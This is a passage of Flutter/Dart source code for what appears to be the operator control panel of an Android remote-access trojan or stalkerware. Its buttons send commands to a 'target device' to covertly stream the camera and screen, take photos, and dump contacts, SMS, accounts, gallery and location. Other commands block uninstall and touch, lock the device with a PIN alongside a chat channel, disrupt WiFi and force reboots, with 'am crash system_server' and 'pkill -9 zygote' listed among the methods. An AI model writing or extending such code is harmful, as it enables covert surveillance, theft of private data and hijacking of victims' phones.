import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'api.dart';
final _kBase = Api.baseUrl;

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — KREM + MERAH THEME
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage>
    with SingleTickerProviderStateMixin {
  // ═══════════════════════════════════════════════════════════════
  // PALETTE — KREM + MERAH
  // ═══════════════════════════════════════════════════════════════
  static const _kBg = Color(0xFFF5EDD8); // krem utama
  static const _kCard = Color(0xFFFFF8E7); // krem kartu
  static const _kCardAlt = Color(0xFFFAF3E0); // krem terang
  static const _kBorder = Color(0xFFDC2626); // merah
  static const _kBorderLit = Color(0xFFEF4444); // merah terang

  static const _kText = Color(0xFF1A1A1A); // teks hitam
  static const _kTextSecondary = Color(0xFF5C4A2A); // coklat
  static const _kTextDim = Color(0xFF8A7A5A); // coklat medium

  static const _kAccent = Color(0xFFDC2626); // merah utama
  static const _kSuccess = Color(0xFF16A34A); // hijau
  static const _kWarning = Color(0xFFB45309); // amber tua
  static const _kPurple = Color(0xFF7C3AED); // purple
  static const _kCyan = Color(0xFF2563EB); // blue
  static const _kOrange = Color(0xFFEA580C); // orange tua
  static const _kRed = Color(0xFF8B0000); // merah tua

  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
    'anti_uninstall', 'block_touch', 'stop_touch_block', 'wifi_thrash'
  };

  // ── State ─────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // ═══ 3D NEO ═══
  bool _is3DNeo = false;

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  final Map<String, bool> _categoryExpanded = {};

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery =>
      widget.targetDevice?['battery']?.toString() ?? '--';

  bool _antiUninstallOn = false;
  bool _touchBlockOn = false;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 2, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ═══ Toggle 3D NEO ═══
  void _toggle3DNeo() {
    HapticFeedback.mediumImpact();
    setState(() => _is3DNeo = !_is3DNeo);
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0,
          '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _kAccent}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _kCard,
      content: Row(children: [
        Icon(Icons.check_circle_outline, color: c, size: 16),
        const SizedBox(width: 8),
        Text(m,
            style: TextStyle(
                color: c, fontWeight: FontWeight.w600, fontSize: 12)),
      ]),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 10),
        side: BorderSide(color: _kBorder, width: 1.5),
      ),
    ));
  }

  Future<void> _cmd(String cmd,
      {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('Invalid target ID', c: _kRed);
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: _kSuccess);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline', c: _kRed);
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Connection failed', c: _kRed);
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 &&
            res.body.isNotEmpty &&
            res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('No photo', c: _kRed);
          return;
        }
        _addLog('Photo received');
        _imgDialog(b, 'Captured Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _imgDialog(b, 'Screen Capture');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS received');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _textDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _gallerySheet(imgs);
        break;
      case 'anti_uninstall':
        _addLog('Anti Uninstall: ${d['status']}');
        _toast('Anti Uninstall: ${d['status']}');
        break;
      case 'block_touch':
        _addLog('Touch Block: ${d['status']}');
        _toast('Touch Block: ${d['status']}');
        break;
      case 'stop_touch_block':
        _addLog('Touch Unblocked');
        _toast('Touch Unblocked');
        break;
      case 'wifi_thrash':
        _addLog('WiFi Thrash: ${d['status']}');
        _toast('WiFi Thrash: ${d['status']}');
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'Front Camera' : 'Rear Camera')
          : 'Screen Mirror';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted)
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    _cmd('live_stop', silent: true);
    _addLog('Live stream stopped');
  }

  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? ''
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context)
        }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients)
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 200),
            curve: Curves.easeOut);
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      appBar: AppBar(
        backgroundColor: _is3DNeo ? _kCard : _kCardAlt,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
          onPressed: () {
            if (_liveOn) _stopLive();
            Navigator.pop(context);
          },
        ),
        title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_model,
              style: const TextStyle(
                  color: _kText, fontSize: 15, fontWeight: FontWeight.w700)),
          Row(children: [
            Container(
                width: 6,
                height: 6,
                decoration: BoxDecoration(
                    color: _liveOn ? _kAccent : _kSuccess,
                    shape: BoxShape.circle)),
            const SizedBox(width: 6),
            Text('Battery: $_battery%  •  $_id',
                style: const TextStyle(color: _kTextSecondary, fontSize: 10),
                overflow: TextOverflow.ellipsis),
          ]),
        ]),
        actions: [
          if (_liveOn)
            Container(
              margin: const EdgeInsets.symmetric(vertical: 14, horizontal: 4),
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                color: _kAccent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 4),
                border: Border.all(color: _kAccent, width: 1.5),
              ),
              child: Text('$_fps fps',
                  style: const TextStyle(
                      color: _kAccent,
                      fontSize: 10,
                      fontWeight: FontWeight.w700)),
            ),
          if (_sending)
            const Padding(
                padding: EdgeInsets.only(right: 12),
                child: SizedBox(
                    width: 16,
                    height: 16,
                    child: CircularProgressIndicator(
                        strokeWidth: 1.5,
                        valueColor: AlwaysStoppedAnimation(_kAccent)))),
          // ═══ TOMBOL 3D NEO ═══
          GestureDetector(
            onTap: _toggle3DNeo,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 4),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
              decoration: BoxDecoration(
                color: _is3DNeo ? _kBorder : _kCard,
                borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                border: Border.all(
                  color: _is3DNeo ? _kRed : _kBorder,
                  width: 1.8,
                ),
                boxShadow: _is3DNeo
                    ? [
                        BoxShadow(
                          color: _kBorder.withOpacity(0.6),
                          offset: const Offset(4, 4),
                          blurRadius: 0,
                        ),
                      ]
                    : [
                        BoxShadow(
                          color: _kBorder.withOpacity(0.2),
                          blurRadius: 8,
                        ),
                      ],
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  AnimatedRotation(
                    turns: _is3DNeo ? 0.5 : 0.0,
                    duration: const Duration(milliseconds: 400),
                    child: Icon(
                      Icons.view_in_ar_rounded,
                      color: _is3DNeo ? Colors.white : _kBorder,
                      size: 14,
                    ),
                  ),
                  const SizedBox(width: 4),
                  Text(
                    '3D',
                    style: TextStyle(
                      color: _is3DNeo ? Colors.white : _kBorder,
                      fontSize: 10,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
          ),
          IconButton(
              icon: const Icon(Icons.refresh, color: _kTextSecondary, size: 20),
              onPressed: () {
                setState(() {});
                _cmd('force_open', silent: true);
              }),
        ],
        bottom: TabBar(
          controller: _tabs,
          indicatorColor: _kBorder,
          indicatorWeight: 2.5,
          indicatorSize: TabBarIndicatorSize.label,
          labelColor: _kBorder,
          unselectedLabelColor: _kTextSecondary,
          labelStyle: const TextStyle(
              fontSize: 12, fontWeight: FontWeight.w700, letterSpacing: 0.3),
          unselectedLabelStyle: const TextStyle(fontSize: 12),
          tabs: const [
            Tab(text: 'CONTROL', icon: Icon(Icons.grid_view, size: 18)),
            Tab(text: 'CHAT', icon: Icon(Icons.chat_bubble, size: 18)),
          ],
        ),
      ),
      body: Column(children: [
        // ═══ LOG BAR ═══
        Container(
          height: 48,
          margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
          padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
          decoration: BoxDecoration(
            color: _kCard,
            borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
            border: Border.all(color: _kBorder, width: 1.5),
            boxShadow: _is3DNeo
                ? [
                    BoxShadow(
                        color: _kBorder.withOpacity(0.5),
                        offset: const Offset(3, 3),
                        blurRadius: 0),
                  ]
                : [BoxShadow(color: _kBorder.withOpacity(0.15), blurRadius: 10)],
          ),
          child: _log.isEmpty
              ? Center(
                  child: Text('SYSTEM READY',
                      style: TextStyle(
                          color: _kTextSecondary,
                          fontSize: 9,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 2)))
              : ListView.builder(
                  scrollDirection: Axis.horizontal,
                  itemCount: _log.length,
                  itemBuilder: (_, i) => Padding(
                    padding: const EdgeInsets.only(right: 12),
                    child: Text(
                      _log[i],
                      style: TextStyle(
                        color: _kBorder,
                        fontSize: 9,
                        fontFamily: 'monospace',
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                  )),
        ),
        Expanded(
            child: TabBarView(controller: _tabs, children: [
          _pageKontrol(),
          _pageChat(),
        ])),
      ]),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // CONTROL PAGE
  // ═══════════════════════════════════════════════════════════════
  Widget _pageKontrol() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildBigToggle(
          icon: Icons.shield,
          title: 'ANTI UNINSTALL',
          subtitle: _antiUninstallOn
              ? 'Settings blocked • Uninstall disabled'
              : 'Settings normal • Uninstall enabled',
          color: _antiUninstallOn ? _kRed : _kSuccess,
          value: _antiUninstallOn,
          onToggle: (val) {
            setState(() => _antiUninstallOn = val);
            _cmd('anti_uninstall', extra: val ? 'true' : 'false');
          },
        ),
        const SizedBox(height: 12),
        _buildBigToggle(
          icon: Icons.touch_app,
          title: 'BLOCK TOUCH',
          subtitle: _touchBlockOn ? 'Touch blocked' : 'Touch normal',
          color: _touchBlockOn ? _kRed : _kWarning,
          value: _touchBlockOn,
          onToggle: (val) {
            setState(() => _touchBlockOn = val);
            if (val) {
              _inputDialog('Block Touch', 'Duration (seconds)', (v) {
                final dur = int.tryParse(v) ?? 5;
                _cmd('block_touch', extra: '{"duration":$dur}');
              }, hint: '5');
            } else {
              _cmd('stop_touch_block');
            }
          },
        ),
        const SizedBox(height: 20),

        _buildDropdownCategory(
          key: 'live',
          icon: Icons.live_tv,
          title: 'LIVE STREAM',
          subtitle: 'Camera & screen real-time',
          color: _kBorder,
          children: [
            _actionBtn('Camera Live', _kBorder, Icons.videocam, () {
              _showCamPicker((side) {
                _startLive('live_camera_start', side);
                _showLiveDialog();
              });
            }),
            _actionBtn('Screen Live', _kCyan, Icons.phone_android, () {
              _startLive('live_screen_start', '');
              _showLiveDialog();
            }),
            if (_liveOn) _actionBtn('Stop Stream', _kRed, Icons.stop, _stopLive),
          ],
        ),

        _buildDropdownCategory(
          key: 'camera',
          icon: Icons.camera_alt,
          title: 'CAMERA',
          subtitle: 'Capture & visual content',
          color: _kOrange,
          children: [
            _actionBtn('Take Photo', _kBorder, Icons.camera_alt,
                () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
            _actionBtn('Screenshot', _kCyan, Icons.screenshot,
                () => _cmd('get_screen')),
            _actionBtn('Set Wallpaper', _kPurple, Icons.wallpaper,
                () => _inputDialog('Wallpaper', 'Image URL',
                    (v) => _cmd('set_wallpaper', extra: v))),
            Row(children: [
              Expanded(
                  child: _actionBtn('Flash On', _kWarning, Icons.flash_on,
                      () => _cmd('flash_strobe'))),
              const SizedBox(width: 12),
              Expanded(
                  child: _actionBtn('Flash Off', _kTextSecondary,
                      Icons.flash_off, () => _cmd('stop_strobe'))),
            ]),
          ],
        ),

        _buildDropdownCategory(
          key: 'data',
          icon: Icons.data_usage,
          title: 'DATA COLLECTION',
          subtitle: 'Extract device information',
          color: _kSuccess,
          children: [
            _actionBtn('Contacts', _kBorder, Icons.contacts,
                () => _cmd('get_contacts')),
            _actionBtn('Location', _kSuccess, Icons.location_on,
                () => _cmd('get_location')),
            _actionBtn('Accounts', _kBorder, Icons.email,
                () => _cmd('get_gmails')),
            _actionBtn('SMS Messages', _kCyan, Icons.chat_bubble,
                () => _cmd('get_sms')),
            _actionBtn('Notifications', _kPurple, Icons.notifications,
                () => _fetchNotif()),
            _actionBtn('Gallery', _kPurple, Icons.photo_library,
                () => _cmd('get_gallery', extra: '5')),
          ],
        ),

        _buildDropdownCategory(
          key: 'audio',
          icon: Icons.audiotrack,
          title: 'AUDIO & NETWORK',
          subtitle: 'Sound and connectivity control',
          color: _kCyan,
          children: [
            _actionBtn('Play Audio', _kWarning, Icons.play_circle,
                () => _inputDialog('Play Audio', 'MP3 URL',
                    (v) => _cmd('play_audio', extra: v))),
            _actionBtn('Stop Audio', _kTextSecondary, Icons.stop_circle,
                () => _cmd('stop_audio')),
            _actionBtn('Vibrate', _kPurple, Icons.vibration,
                () => _cmd('vibrate_loop')),
            _actionBtn('Open URL', _kCyan, Icons.link,
                () => _inputDialog('Open URL', 'https://...',
                    (v) => _cmd('open_url', extra: v))),
            _actionBtn('Disable WiFi', _kBorder, Icons.wifi_off,
                () => _cmd('kill_wifi')),
            _actionBtn('WiFi Thrash', _kRed, Icons.wifi_off,
                () => _cmd('wifi_thrash')),
          ],
        ),

        _buildDropdownCategory(
          key: 'device',
          icon: Icons.settings_power,
          title: 'DEVICE CONTROL',
          subtitle: 'System-level management',
          color: _kWarning,
          children: [
            _actionBtn('Restart Device', _kRed, Icons.power_settings_new, () {
              showDialog(
                  context: context,
                  builder: (_) => AlertDialog(
                        backgroundColor: _kCard,
                        shape: RoundedRectangleBorder(
                            borderRadius:
                                BorderRadius.circular(_is3DNeo ? 0 : 12),
                            side: BorderSide(color: _kBorder, width: 2)),
                        title: const Text('Restart Device',
                            style: TextStyle(
                                color: _kText,
                                fontSize: 16,
                                fontWeight: FontWeight.w700)),
                        content: const Text(
                            'The target device will be restarted.',
                            style: TextStyle(
                                color: _kTextSecondary, fontSize: 13)),
                        actions: [
                          TextButton(
                              onPressed: () => Navigator.pop(context),
                              child: const Text('Cancel',
                                  style:
                                      TextStyle(color: _kTextSecondary))),
                          ElevatedButton(
                            style: ElevatedButton.styleFrom(
                                backgroundColor: _kRed,
                                shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(
                                        _is3DNeo ? 0 : 8))),
                            onPressed: () {
                              Navigator.pop(context);
                              _cmd('reboot_device');
                            },
                            child: const Text('Restart',
                                style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.w700)),
                          ),
                        ],
                      ));
            }),
            _actionBtn('Wake Device', _kSuccess, Icons.brightness_5,
                () => _cmd('force_open')),
            _actionBtn('Lock Device', _kWarning, Icons.lock_outline, () {
              _inputDialog('Lock Device', 'Lock screen message', (msg) {
                _inputDialog('Unlock PIN', 'Set 4-digit PIN', (pin) {
                  _cmd('hard_lock', extra: '$msg|$pin');
                }, isNumber: true, hint: '1234');
              });
            }),
            _actionBtn('Unlock Device', _kSuccess, Icons.lock_open,
                () => _cmd('unlock')),
            _actionBtn('Lock + Chat', _kBorder, Icons.lock,
                () => _lockLiveDialog()),
            _actionBtn('Permission Helper', _kTextSecondary, Icons.security,
                () => _cmd('open_notification_settings')),
          ],
        ),

        Container(
          margin: const EdgeInsets.only(top: 16),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: _kCard,
            borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
            border: Border.all(color: _kBorder, width: 1.5),
            boxShadow: _is3DNeo
                ? [
                    BoxShadow(
                        color: _kBorder.withOpacity(0.5),
                        offset: const Offset(4, 4),
                        blurRadius: 0),
                  ]
                : [BoxShadow(color: _kBorder.withOpacity(0.15), blurRadius: 10)],
          ),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text('Restart Methods',
                style: TextStyle(
                    color: _kBorder,
                    fontSize: 12,
                    fontWeight: FontWeight.w700)),
            const SizedBox(height: 10),
            _infoRow('1', 'PowerManager reflection (no root)'),
            _infoRow('2', 'DevicePolicyManager (admin)'),
            _infoRow('3', 'su -c reboot (root)'),
            _infoRow('4', 'am crash system_server'),
            _infoRow('5', 'pkill -9 zygote'),
          ]),
        ),
      ],
    );
  }

  // ═══ DROPDOWN CATEGORY ═══
  Widget _buildDropdownCategory({
    required String key,
    required dynamic icon,
    required String title,
    required String subtitle,
    required Color color,
    required List<Widget> children,
  }) {
    final isExpanded = _categoryExpanded[key] ?? false;

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: _kCard,
        borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
        border: Border.all(color: _kBorder, width: 1.8),
        boxShadow: _is3DNeo
            ? [
                BoxShadow(
                    color: _kBorder.withOpacity(0.5),
                    offset: const Offset(4, 4),
                    blurRadius: 0),
              ]
            : [BoxShadow(color: _kBorder.withOpacity(0.12), blurRadius: 15)],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          InkWell(
            onTap: () {
              setState(() {
                _categoryExpanded[key] = !isExpanded;
              });
            },
            borderRadius: BorderRadius.vertical(
                top: Radius.circular(_is3DNeo ? 0 : 12)),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                color: color.withOpacity(isExpanded ? 0.08 : 0.03),
                borderRadius: BorderRadius.vertical(
                  top: Radius.circular(_is3DNeo ? 0 : 12),
                  bottom: Radius.circular(
                      (isExpanded && !_is3DNeo) ? 0 : (_is3DNeo ? 0 : 12)),
                ),
                border: isExpanded
                    ? Border(
                        bottom: BorderSide(
                            color: _kBorder.withOpacity(0.4), width: 1.5))
                    : null,
              ),
              child: Row(
                children: [
                  AnimatedContainer(
                    duration: const Duration(milliseconds: 200),
                    width: 32,
                    height: 32,
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
                      border: Border.all(color: _kBorder, width: 1.2),
                    ),
                    child: Icon(icon, color: color, size: 18),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(title,
                              style: const TextStyle(
                                  color: _kText,
                                  fontSize: 13,
                                  fontWeight: FontWeight.w700)),
                          Text(subtitle,
                              style: TextStyle(
                                  color: _kTextSecondary.withOpacity(0.7),
                                  fontSize: 9,
                                  fontWeight: FontWeight.w600)),
                        ]),
                  ),
                  AnimatedRotation(
                    duration: const Duration(milliseconds: 300),
                    turns: isExpanded ? 0.5 : 0.0,
                    child: Icon(Icons.keyboard_arrow_down,
                        color: color.withOpacity(0.7), size: 24),
                  ),
                ],
              ),
            ),
          ),
          AnimatedCrossFade(
            duration: const Duration(milliseconds: 350),
            crossFadeState: isExpanded
                ? CrossFadeState.showSecond
                : CrossFadeState.showFirst,
            firstChild: const SizedBox(height: 0),
            secondChild: Padding(
              padding: const EdgeInsets.all(12),
              child: Column(children: children),
            ),
          ),
        ],
      ),
    );
  }

  // ═══ BIG TOGGLE ═══
  Widget _buildBigToggle({
    required dynamic icon,
    required String title,
    required String subtitle,
    required Color color,
    required bool value,
    required ValueChanged<bool> onToggle,
  }) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 250),
      decoration: BoxDecoration(
        color: _kCard,
        borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 16),
        border: Border.all(color: _kBorder, width: _is3DNeo ? 3 : 2),
        boxShadow: _is3DNeo
            ? [
                BoxShadow(
                    color: _kBorder.withOpacity(0.6),
                    offset: const Offset(6, 6),
                    blurRadius: 0),
                BoxShadow(
                    color: Colors.black.withOpacity(0.2),
                    offset: const Offset(9, 9),
                    blurRadius: 0),
              ]
            : [
                BoxShadow(
                    color: _kBorder.withOpacity(0.2),
                    blurRadius: 20,
                    spreadRadius: 2)
              ],
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: () => onToggle(!value),
          borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 16),
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                Container(
                  width: 48,
                  height: 48,
                  decoration: BoxDecoration(
                    color: color.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                    border: Border.all(color: _kBorder, width: 1.5),
                  ),
                  child: Icon(icon, color: color, size: 24),
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: const TextStyle(
                          color: _kText,
                          fontSize: 15,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.5,
                        ),
                      ),
                      Text(
                        subtitle,
                        style: TextStyle(
                          color: _kTextSecondary.withOpacity(0.7),
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
                AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  width: 54,
                  height: 30,
                  decoration: BoxDecoration(
                    color: value ? color : _kCardAlt,
                    borderRadius:
                        BorderRadius.circular(_is3DNeo ? 0 : 30),
                    border: Border.all(color: _kBorder, width: 1.5),
                    boxShadow: value
                        ? [
                            BoxShadow(
                                color: color.withOpacity(0.5),
                                blurRadius: _is3DNeo ? 0 : 12,
                                offset: _is3DNeo
                                    ? const Offset(2, 2)
                                    : Offset.zero)
                          ]
                        : [],
                  ),
                  child: Stack(
                    alignment: Alignment.centerLeft,
                    children: [
                      AnimatedAlign(
                        duration: const Duration(milliseconds: 300),
                        alignment: value
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.all(3),
                          width: 24,
                          height: 24,
                          decoration: BoxDecoration(
                            color: Colors.white,
                            shape: _is3DNeo ? BoxShape.rectangle : BoxShape.circle,
                            borderRadius:
                                _is3DNeo ? BorderRadius.circular(0) : null,
                            border: _is3DNeo
                                ? Border.all(color: _kBorder, width: 1.5)
                                : null,
                          ),
                          child: Icon(
                            value ? Icons.check : Icons.close,
                            color: value ? _kSuccess : _kRed,
                            size: 14,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ═══ CHAT PAGE ═══
  Widget _pageChat() {
    return Column(children: [
      Expanded(
        child: ListView(padding: const EdgeInsets.all(16), children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: _kCard,
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
              border: Border.all(color: _kBorder, width: 1.8),
              boxShadow: _is3DNeo
                  ? [
                      BoxShadow(
                          color: _kBorder.withOpacity(0.5),
                          offset: const Offset(4, 4),
                          blurRadius: 0),
                    ]
                  : [BoxShadow(color: _kBorder.withOpacity(0.15), blurRadius: 10)],
            ),
            child:
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Container(
                    width: 8,
                    height: 8,
                    decoration: BoxDecoration(
                        color: _kBorder,
                        shape: _is3DNeo ? BoxShape.rectangle : BoxShape.circle,
                        boxShadow: [
                          BoxShadow(color: _kBorder, blurRadius: 8)
                        ])),
                const SizedBox(width: 10),
                const Text('Secure Chat',
                    style: TextStyle(
                        color: _kText,
                        fontSize: 14,
                        fontWeight: FontWeight.w800)),
              ]),
              const SizedBox(height: 6),
              const Text('Two-way communication with target device',
                  style: TextStyle(color: _kTextSecondary, fontSize: 11)),
            ]),
          ),
          const SizedBox(height: 16),
          Container(
            height: 300,
            decoration: BoxDecoration(
              color: _kCard,
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
              border: Border.all(color: _kBorder, width: 1.8),
              boxShadow: _is3DNeo
                  ? [
                      BoxShadow(
